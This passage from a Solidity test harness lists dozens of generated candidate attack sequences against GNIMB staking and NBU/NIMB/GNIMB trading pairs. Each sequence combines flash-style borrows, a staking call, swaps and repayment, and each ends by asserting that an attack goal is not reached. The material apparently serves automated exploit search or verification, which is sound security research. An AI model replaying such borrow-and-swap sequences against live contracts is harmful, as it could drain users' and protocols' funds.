        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
